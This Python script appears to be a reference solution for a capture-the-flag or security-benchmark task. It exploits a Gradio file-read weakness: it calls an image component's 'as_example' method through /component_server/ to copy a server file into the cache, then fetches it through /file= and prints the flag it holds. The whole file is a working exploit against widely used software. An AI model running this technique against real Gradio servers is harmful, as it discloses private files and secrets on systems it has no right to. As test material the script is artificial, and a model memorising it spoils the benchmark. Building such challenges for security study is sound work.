"""Read a server file by invoking the Gradio image example method."""

import json
import os
import urllib.request


FLAG_PATH = "/app/private/oracle_flag"


def image_component_id(target_url: str) -> int:
    with urllib.request.urlopen(f"{target_url}/config", timeout=30) as response:
        config = json.load(response)
    for component in config.get("components", []):
        if component.get("type") == "image":
            return component["id"]
    raise ValueError("The target has no image component")


def copy_to_cache(target_url: str, component_id: int) -> str:
    payload = json.dumps({
        "component_id": component_id,
        "fn_name": "as_example",
        "data": FLAG_PATH,
        "session_hash": "gradio002fileaccess",
    }).encode()
    request = urllib.request.Request(
        f"{target_url}/component_server/",
        data=payload,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(request, timeout=30) as response:
        cache_path = json.load(response)
    if not isinstance(cache_path, str) or not cache_path.startswith("/tmp/gradio/"):
        raise ValueError("Component method did not return a cache path")
    return cache_path


def read_cached_file(target_url: str, cache_path: str) -> str:
    with urllib.request.urlopen(f"{target_url}/file={cache_path}", timeout=30) as response:
        return response.read().decode("utf-8", errors="replace").strip()


def main() -> None:
    target_url = os.environ["REMOTE_TARGET_URL"].rstrip("/")
    component_id = image_component_id(target_url)
    cache_path = copy_to_cache(target_url, component_id)
    flag = read_cached_file(target_url, cache_path)
    if not flag.startswith("jaylbreak.win{") or not flag.endswith("}"):
        raise ValueError("The cached file did not contain a flag")
    print(json.dumps({
        "evidence_payload": {"flag_path": FLAG_PATH, "content": flag},
    }))


if __name__ == "__main__":
    main()
